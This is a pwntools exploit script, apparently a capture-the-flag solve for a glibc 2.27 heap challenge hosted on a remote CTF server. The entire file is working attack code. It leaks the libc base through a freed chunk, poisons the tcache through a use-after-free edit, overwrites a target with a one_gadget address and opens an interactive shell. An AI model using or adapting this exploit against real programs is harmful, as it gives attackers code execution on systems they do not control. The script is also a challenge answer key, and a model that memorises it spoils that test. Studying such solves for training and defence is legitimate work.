#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("task_patched")
libc = ELF("./libc-2.27.so")

local = False 
if local:
    p = process("./task_patched")
    gdb.attach(p,'''c''')
else:
    p = remote('0.cloud.chals.io', 29394)

elf = context.binary = ELF('./task_patched', checksec=False)

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def add(size):
    sla(b'>>', b'1')
    sla(b'book size:', str(size))

def edit(idx, data):
    sla(b'>>', b'2')
    sla(b'Book index:', str(idx))
    sla(b'content:', data)

def delete(idx):
    sla(b'>>', b'3')
    sla(b'Book index:', str(idx))

def show(idx):
    sla(b'>>', b'4')
    sla(b'Book index:', str(idx))


#############
# Leak_libc #
#############

add(0x500)
add(0x28)
add(0x28)
delete(0)
show(0)
p.recvuntil(b'OUTPUT: ')
libc.address  = int.from_bytes(p.recv(6),'little') - 0x3ebca0
log.info('Libc_base:    ' + hex(libc.address))
delete(1)
edit(1, p64(0x602110))
add(0x28)

############ one_gadget ############

og1 = libc.address + 0x4f2a5
og2 = libc.address + 0x4f302
og3 = libc.address + 0x10a2fc
og = og1
log.info('One_gadget:   ' + hex(og))

add(0x28)
edit(4, p64(og))
sla(b'>>', b'17')

p.interactive()
